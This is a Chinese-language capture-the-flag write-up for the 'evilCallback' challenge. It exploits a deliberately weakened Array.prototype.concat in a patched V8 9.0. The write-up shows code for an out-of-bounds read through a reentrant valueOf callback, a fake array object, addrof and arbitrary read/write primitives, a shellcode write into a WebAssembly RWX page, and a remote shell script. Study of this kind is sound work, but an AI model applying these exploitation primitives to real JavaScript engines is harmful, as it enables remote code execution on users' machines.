# evilCallback

## 题目简述

题目提供带补丁的 V8 9.0.257.19 和独立 shell `d8`，要求利用 JavaScript 引擎漏洞执行 `/readflag`。补丁关闭了指针压缩，并削弱 `Array.prototype.concat` 的若干安全检查，使数组遍历期间能够执行恶意回调。最终要从越界读发展到任意地址读写，再借 WebAssembly 的可执行代码页运行 shellcode，因此归入 pwn。

本地调试必须使用与远端一致的堆限制：

```text
./d8 --max-heap-size 1024 --expose-gc --allow-natives-syntax poc.js
```

完整利用本身不依赖 `%DebugPrint` 或显式 `gc()`；这些开关只用于本地定位对象和验证布局。

## 解题过程

### 补丁造成 concat 的重入问题

`evilCallback.diff` 主要删除了三类保护：`HasOnlySimpleElements`、`visitor->has_simple_elements()`，以及 `IterateElements` 中禁止执行 JavaScript 的 `DisallowJavascriptExecution`。在 double 元素分支中，V8 先缓存元素后备存储和长度：

```cpp
Handle<FixedDoubleArray> elements(
    FixedDoubleArray::cast(array->elements()), isolate);
int fast_length = static_cast<int>(length);

for (int j = 0; j < fast_length; j++) {
    if (!elements->is_the_hole(j)) {
        double value = elements->get_scalar(j);
        // ...
    } else {
        JSReceiver::GetElement(isolate, array, j);
    }
}
```

普通元素走快速读取；遇到 hole 时，`GetElement` 会沿原型链查找属性，并可能调用 getter 或对象的 `valueOf`。补丁允许该回调重入 JavaScript。若回调把原数组长度缩成 1 并触发 GC，局部变量 `fast_length` 和 `elements` 仍指向进入循环时的旧值。循环随后继续读取已经失效或越界的 `FixedDoubleArray`。

### 触发越界读并识别对象布局

先用数组字面量构造 `HOLEY_DOUBLE_ELEMENTS`，因为这种分配下元素后备存储通常位于 `JSArray` 对象之前，越界向后读更容易碰到数组头部。利用自定义构造器的 `Symbol.species` 让 `concat` 把结果写进受控 `Float64Array`，再在原型的 hole 位置布置回调：

```javascript
const corrupted = [, 1.1, 2.2, 3.3, 4.4, 5.5];

Array.prototype[0] = {
    valueOf() {
        corrupted.length = 1;
        gc();
        delete Array.prototype[0];
        return 4.3;
    }
};

const leaked = corrupted.concat();
```

用同一块缓冲区上的 `Float64Array` 与 `BigUint64Array` 无损转换浮点位模式：

```javascript
const cvt = new ArrayBuffer(8);
const f64 = new Float64Array(cvt);
const u64 = new BigUint64Array(cvt);

function f2i(x) {
    f64[0] = x;
    return u64[0];
}

function i2f(x) {
    u64[0] = x;
    return f64[0];
}
```

泄漏内容中可识别出相邻数组的 `map`、`properties`、`elements` 和 Smi 编码的 `length`。这些值既用于确认偏移，也为下一步伪造合法数组头提供模板。堆上对象地址最低位为标签位，调试器显示的 `JSObject` 指针在查看原始内存时要减去 1。

### 重叠 hole，取得伪造对象

第二次触发改用可保存对象的 `HOLEY_ELEMENTS`。安排 GC 后的受控数据覆盖将被继续访问的 hole，并让该槽位指向预先伪造的数组头。`concat` 把它当作真实对象处理时，再临时覆盖 `Object.prototype.valueOf`：

```javascript
Object.prototype.valueOf = function () {
    controlledArray = this;
    delete Object.prototype.valueOf;
    throw "stop concat";
};
```

抛出异常可以在取出伪对象后立即终止遍历，避免后续垃圾数据继续被解释成对象而崩溃。伪数组头中的 `map` 使用前一步泄漏的合法值，`elements` 字段则落在另一个可控数组元素中，因此可以反复修改。

### 组合 addrof、任意读与任意写

让一个对象数组和浮点数组共享被伪造的后备存储后，可以构造三个原语。V8 的 `FixedArray` 数据区在对象头之后 `0x10` 字节，所以任意读写时把伪数组的 `elements` 指向目标地址减 `0x10`：

```javascript
function getAddr(obj) {
    fake[2] = i2f(getAddrArrayAddress);
    getAddrArray[0] = obj;
    return f2i(controlledArray[0]);
}

function readAddr(addr) {
    fake[2] = i2f(addr - 0x10n);
    return f2i(controlledArray[0]);
}

function writeAddr(addr, value) {
    fake[2] = i2f(addr - 0x10n);
    controlledArray[0] = i2f(value);
}
```

这一步的所有 map 和字段偏移都来自题目所给二进制的实际调试结果，不能直接套用其他 V8 版本或启用指针压缩的布局。

### 定位 Wasm RWX 页并写入 shellcode

创建一个最小 WebAssembly 模块并取得其导出函数 `f`。在本题版本中，按以下指针链可找到实例的可读写执行代码页：

```javascript
const fAddr = getAddr(f);
const sharedInfo = readAddr(fAddr + 0x18n);
const exportedData = readAddr(sharedInfo + 0x08n);
const instance = readAddr(exportedData + 0x10n);
const rwxPage = readAddr(instance + 0x80n);
```

直接用浮点数组写某些非规范浮点位模式时，高位可能被 V8 的数值处理改变。更稳定的办法是新建 `ArrayBuffer` 和 `DataView`，把 `ArrayBuffer` 对象偏移 `0x20` 的 backing-store 指针改成 `rwxPage`：

```javascript
const dataBuffer = new ArrayBuffer(0x200);
const dataView = new DataView(dataBuffer);
writeAddr(getAddr(dataBuffer) + 0x20n, rwxPage);

for (let i = 0; i < shellcode.length; i++) {
    dataView.setFloat64(i * 8, i2f(shellcode[i]), true);
}
```

写入执行 `/bin/sh` 的 shellcode 后调用 `f()` 即可落入 RWX 页。远端包装器按行读取 JavaScript，遇到 `<EOF>` 才启动 `d8`；利用获得 shell 后发送 `/readflag`：

```python
io.send(exploit_js)
io.sendline(b"<EOF>")
io.sendline(b"/readflag")
io.interactive()
```

## 方法总结

漏洞根因是原生内置函数缓存了数组长度和后备存储，却在遍历 hole 时允许 JavaScript 回调修改同一对象并触发 GC，形成典型的重入后使用陈旧状态。完整利用链为：`concat` 回调造成越界读，泄漏对象元数据；通过对象元素与 hole 重叠伪造数组；修改伪数组的 `elements` 获得任意地址读写；最后劫持 `ArrayBuffer` backing store，把 shellcode 写入 Wasm RWX 页。复现时最重要的是固定 `--max-heap-size 1024`、按实际 V8 版本核对对象布局，并把泄漏、伪造、任意读写和代码执行分阶段验证。
